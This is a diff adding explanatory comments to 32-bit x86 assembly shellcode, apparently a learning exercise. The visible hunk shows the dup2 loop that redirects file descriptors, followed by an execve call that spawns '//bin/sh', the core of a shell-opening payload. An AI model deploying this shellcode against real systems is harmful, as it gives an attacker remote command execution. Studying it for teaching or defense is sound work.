@@ -53,21 +53,20 @@ dup2:
 	xor eax,eax ;reset the eax
 	mov al, 63 ;call dup2
 	int 0x80
-	dec ecx
-	jns dup2
+	dec ecx ;minus the ecx by 1
+	jns dup2 ;jump if not signed
 	
 	;execve
-	
 	xor eax, eax
 	push eax ;set envp to 0
-	push 0x68732f2f;'//bin/sh'
-	push 0x6e69622f
-	mov ebx, esp ;ebx points to pathname
-	push eax	;push another 0 on the stack
-	mov edx, esp	;edx points to envp
-	push ebx
-	mov ecx, esp	;ecx points to argv
-	mov al, 11
+	push 0x68732f2f ;ib//
+	push 0x6e69622f ;hs/n
+	mov ebx, esp ;now our stack is //bin/sh0x00000000, and ebx points to the pathname //bin/sh
+	push eax	;push another 0 on the stack, so now our stack is 0x0//bin/sh0x00000000
+	mov edx, esp	;edx points to envp, which is the 0x0
+	push ebx ;push the memory address of //bin/sh on the stack, so now we have addr0x0//bin/sh0x00000000
+	mov ecx, esp	;ecx points to the address of the //bin/sh, which is the argument argv
+	mov al, 11 ;call the execve
 	int 0x80
 	
 	
